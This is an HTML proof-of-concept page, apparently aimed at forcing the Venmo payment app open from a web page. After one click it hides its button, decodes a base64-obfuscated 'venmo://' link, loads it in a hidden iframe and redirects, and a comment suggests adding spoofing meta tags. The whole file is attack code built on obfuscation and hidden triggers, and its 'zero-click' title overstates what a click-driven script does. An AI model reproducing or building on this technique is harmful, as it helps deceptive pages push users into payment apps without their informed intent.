<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Venmo Zeroâ€‘Click PoC (Trusted Gesture)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- You can add additional spoofing meta tags here if needed -->
</head>
<body>
  <button id="launchVenmo" style="font-size: 18px; padding: 10px 20px;">
    Launch Venmo (Click Me)
  </button>
  <script>
    // Base64 decoding function
    function b64Decode(str) {
      return decodeURIComponent(
        atob(str)
          .split('')
          .map(function(c) {
            return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
          })
          .join('')
      );
    }
    
    // Base64-encoded string for "venmo://"
    var encodedVenmo = "dmVubW87Ly8=";  // This decodes to "venmo://"

    // When the user clicks the button (trusted gesture):
    document.getElementById('launchVenmo').addEventListener('click', function(event) {
      // Immediately hide the button to mimic a hidden trigger
      this.style.display = 'none';

      // Decode the Venmo URL
      var venmoURL = b64Decode(encodedVenmo);
      console.log("Decoded Venmo URL:", venmoURL);

      // Inject a hidden iframe to quickly initiate the navigation
      var iframe = document.createElement('iframe');
      iframe.style.display = 'none';
      iframe.src = venmoURL;
      document.body.appendChild(iframe);

      // Also trigger a direct redirect via window.location.href after a very short delay
      setTimeout(function() {
        window.location.href = venmoURL;
      }, 10);
    });
  </script>
</body>
</html>
